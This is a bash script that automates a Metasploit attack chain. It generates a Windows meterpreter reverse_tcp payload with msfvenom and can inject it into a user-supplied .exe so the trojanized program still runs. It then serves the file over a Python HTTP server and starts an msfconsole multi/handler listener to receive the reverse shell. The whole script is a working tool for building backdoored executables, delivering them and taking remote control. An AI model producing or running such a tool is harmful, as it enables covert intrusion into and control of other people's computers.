#!/bin/bash

#~ 1. Generate the payload 
#~ 2. Get Port 
#~ 3. Create a condition: if the user want, for a path of executable to inject 
#~ 4. Start a listener automatically 
#~ 5. Start SimpleHTTPServer automatically 

#fetch user IP address and save it in a variable
MYIP=$(hostname -I | awk '{print $1}')

#get port number from user
function get_prt {
read -p "[?]Enter the port number: " PRT
}

#ask user if want to inject payload
function inject_choice {
INJECT_PL_CHECKER=0
while [ "$INJECT_PL_CHECKER" -eq 0 ]
do
	read -p "[?]Do you want to inject the payload into a .exe file? (Y/n) " INJECT_PL
	case $INJECT_PL in
	y | Y | yes | Yes | YES )
	inject_y
	INJECT_PL_CHECKER=1
	shift
	;;
	n | N | no | No | NO )
	inject_n
	INJECT_PL_CHECKER=2
	shift
	;;
	* )
	echo -e "[!]Please enter only 'y' or 'n'."
	;;
	esac
done
}

#validate if execute file exists, inject payload
function inject_y {
	PATH_EXE_CHECKER=0
	while [ "$PATH_EXE_CHECKER" -eq 0 ]
	do
		read -p "[?]Enter the full path of the executable file: " PATH_EXE
		EXE_F=$(echo $PATH_EXE | awk -F "/" '{print $NF}')
		echo "Filename: $EXE_F"
		EXE_X=$(echo $EXE_F | awk -F "." '{print $1}')
		EXE_P=$(echo $PATH_EXE | awk -F "$(echo $EXE_F)" '{print $1}')
		echo "Path: $EXE_P"
		cd $EXE_P
		PAY_IN_F=$EXE_X$PRT.exe
		if [ -f "$EXE_F" ]; then
			sudo msfvenom -p windows/meterpreter/reverse_tcp lhost=$MYIP lport=$PRT -x $PATH_EXE -k -f exe -o $PAY_IN_F
			PATH_EXE_CHECKER=1
		else
			echo "[!]The file $EXE_F file does not exist. Please try again."
		fi
		
		cd ~-
		
		if [ -f "$EXE_P$PAY_IN_F" ]; then
			mv $EXE_P$PAY_IN_F ./
			echo "The file $PAY_IN_F has been created and moved to the currect folder $PWD."		
		fi
		
	done
}

#create payload without injection
function inject_n {
	sudo msfvenom -p windows/meterpreter/reverse_tcp lhost=$MYIP lport=$PRT -f exe -o rev$PRT.exe
}

#start SimpleHTTPServer as a background process
function httpserver_start {
	PID_N=$(ps aux | grep -i simplehttpserver | grep python | awk '{print $2}')
	if [ ! -z "$PID_N" ]; then
		kill -9 $PID_N
	else 
		python -m SimpleHTTPServer 8080 &
	fi
	
}

#create listen.rc and start msfconsole
function  msfconsole_start {
	echo "use exploit/multi/handler" > listener.rc
	echo "set payload windows/meterpreter/reverse_tcp" >> listener.rc
	echo "set lhost $MYIP" >> listener.rc
	echo "set lport $PRT" >> listener.rc
	echo "exploit" >> listener.rc

	msfconsole -r listener.rc
}


get_prt
inject_choice
httpserver_start
msfconsole_start
